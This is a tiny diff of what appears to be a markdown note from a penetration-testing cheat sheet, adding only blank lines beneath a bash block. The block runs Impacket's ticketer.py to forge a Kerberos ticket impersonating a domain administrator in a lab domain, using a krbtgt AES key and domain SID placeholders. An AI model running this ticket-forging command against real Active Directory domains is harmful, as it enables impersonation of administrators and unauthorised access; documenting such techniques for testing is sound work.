@@ -16,3 +16,5 @@ updated_at: '2023-04-10T20:26:34.685256+00:00'
 ```bash
 ticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_user' -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser'
 ```
+
+
